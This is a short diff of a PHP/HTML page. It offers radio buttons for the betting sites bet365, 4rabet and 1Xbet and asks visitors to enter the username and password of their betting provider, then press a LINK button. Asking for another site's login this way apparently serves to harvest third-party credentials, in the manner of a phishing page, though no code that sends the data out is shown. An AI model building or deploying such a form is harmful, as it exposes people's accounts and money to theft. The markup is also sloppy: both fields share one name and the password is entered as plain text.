@@ -12,12 +12,7 @@ echo <<< END_OF_TEXT
 <label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="bet365" id="bet365" required>bet365</label><br>
 <label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="4raBet" id="4rabet" required>4rabet</label><br>
 <label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="1Xbet" id="1Xbet" required>1Xbet</label><br>
-
-
-
-
 <h2>SELECT AND ENTER THE USERNAME AND PASSWORD OF YOUR BETTING HOST PROVIDER</h2>
-
 <input type="text" name="name" placeholder="USERNAME" style="border-radius: 10px;"  >
 <input type="text" name="name" placeholder="PASSWORD" style="border-radius: 10px;"  >
 <input type="submit" value="LINK" onclick="location.href='register.php'" >
